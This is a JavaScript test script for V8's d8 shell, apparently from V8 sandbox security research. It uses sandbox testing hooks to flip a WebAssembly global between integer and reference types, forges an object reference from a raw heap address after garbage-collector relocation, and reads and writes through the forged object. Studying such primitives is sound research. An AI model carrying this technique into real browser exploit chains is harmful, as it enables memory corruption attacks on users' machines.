// C21 H11: refresh forged ref after GC relocation.
//
// H10 shows the target can remain WeakRef-live but move, leaving stale bytes in
// the numeric global. Here we rewrite those bytes to the new address by flipping
// raw_type back to i64, then to externref again. This proves stale behavior is
// caused by untracked relocation and that arbitrary sandbox write can refresh
// the forged reference.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kHeapObjectTag = 1;
const kI64RawTypeSmi = 0x2e20;
const kExternRefRawTypeSmi = 0x160a;

let builder = new WasmModuleBuilder();
builder.addGlobal(kWasmI64, true, false, [kExprI64Const, 0]).exportAs('g');
let global = builder.instantiate().exports.g;

let weak;
let oldTagged;
(function() {
  let target = new Uint32Array([0xaaaa, 0xbbbb, 0xcccc, 0xdddd]);
  weak = new WeakRef(target);
  oldTagged = Sandbox.getAddressOf(target) + kHeapObjectTag;
  print(`old=0x${oldTagged.toString(16)}`);
  global.value = BigInt(oldTagged);
})();

for (let r = 0; r < 3; r++) gc();

let weakValue = weak.deref();
if (!weakValue) {
  print('weak=cleared');
  quit(0);
}

let newTagged = Sandbox.getAddressOf(weakValue) + kHeapObjectTag;
print(`new=0x${newTagged.toString(16)}`);
print(`moved=${newTagged !== oldTagged}`);

// Refresh numeric bytes, then re-interpret as externref.
Sandbox.corruptObjectField(global, 'raw_type', kI64RawTypeSmi);
global.value = BigInt(newTagged);
Sandbox.corruptObjectField(global, 'raw_type', kExternRefRawTypeSmi);

let recovered = global.value;
print(`same=${recovered === weakValue}`);
print(`rec=${recovered.length}:${recovered[0]}:${recovered[3]}`);
recovered[1] = 0x12345678;
print(`write=${recovered[1]}:${weakValue[1]}`);
